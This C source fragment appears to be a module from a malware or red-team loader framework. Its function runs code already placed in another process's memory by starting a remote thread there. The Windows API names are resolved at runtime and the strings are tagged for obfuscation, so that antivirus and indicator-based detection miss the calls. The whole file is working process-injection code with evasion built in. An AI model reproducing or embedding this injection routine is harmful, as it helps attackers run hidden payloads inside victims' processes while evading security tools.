// Description: Execute RX mem in remote process using Dyn resolved CreateRemoteThread + WaitForSingleObject + CloseHandle
// Used WinAPIs: GetProcAddress, GetModuleHandleA
// IOCS strings:
BOOL ExecuteMemory(HANDLE process, LPVOID baseAddress) {
    typedef HANDLE (WINAPI * CreateRemoteThread_) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    typedef DWORD (WINAPI * WaitForSingleObject_) (HANDLE hHandle, DWORD dwMilliseconds);
    typedef BOOL (WINAPI * CloseHandle_) (HANDLE hObject);

    CreateRemoteThread_ _CreateRemoteThread = (CreateRemoteThread_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CreateRemoteThread"<ob_end>);
    WaitForSingleObject_ _WaitForSingleObject = (WaitForSingleObject_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"WaitForSingleObject"<ob_end>);
    CloseHandle_ _CloseHandle = (CloseHandle_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CloseHandle"<ob_end>);

    HANDLE thread = _CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL);
    if (thread == NULL) {
        #ifdef DEBUG
            printf("[-] CreateRemoteThread failed (%d)\n", GetLastError());
        #endif
        return FALSE;
    }

    _WaitForSingleObject(thread, INFINITE);
    _CloseHandle(thread);
    return TRUE;
}
